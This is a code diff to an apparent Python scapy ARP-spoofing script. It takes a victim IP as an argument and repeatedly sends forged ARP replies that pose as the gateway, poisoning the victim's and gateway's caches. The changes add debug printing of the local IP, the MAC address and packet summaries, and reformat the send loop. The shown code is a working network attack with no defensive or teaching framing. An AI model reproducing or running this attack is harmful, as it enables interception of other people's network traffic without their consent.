@@ -4,9 +4,6 @@
 
 import sys  #for command line argument
 import time
-import os
-import shutil
-import tempfile
 from random import randint
 from scapy.all import *
 from scapy.layers.inet import *
@@ -32,6 +29,9 @@ my_ip = get_ip()
 
 my_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
 for ele in range(0,8*6,8)][::-1])) 
+
+print(my_ip)
+print(my_mac)
 
 victim_ip = sys.argv[1]
 
@@ -64,7 +64,12 @@ reply2 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=gateway, hwdst=victim_mac, pdst=vi
 go2 = Ether(dst=victim_mac, src=my_mac) / reply2
 
 while  1:
-    sendp(go1, verbose = 2)
-    sendp(go2, verbose = 2)
+	print(go1.summary())
+	sendp(go1, verbose = 2)
+	print()
 
-    time.sleep(randint(1, 5))
+	print(go2.summary())
+	sendp(go2, verbose = 2)
+	print()
+
+	time.sleep(randint(1, 5))
